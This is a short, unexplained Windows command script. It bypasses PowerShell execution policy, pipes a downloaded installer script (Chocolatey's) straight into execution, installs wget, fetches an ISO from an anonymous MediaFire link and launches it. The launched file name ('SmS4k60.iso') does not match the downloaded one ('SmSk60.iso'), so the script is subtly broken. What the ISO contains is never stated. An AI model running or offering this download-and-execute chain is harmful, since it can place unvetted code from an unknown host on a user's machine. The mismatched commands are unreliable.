powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install wget --force -y

cd %USERPROFILE%\Downloads


wget https://download1526.mediafire.com/vennxtiwk1kg/fdaogy5ibved1py/SmSk60.iso



start "" SmS4k60.iso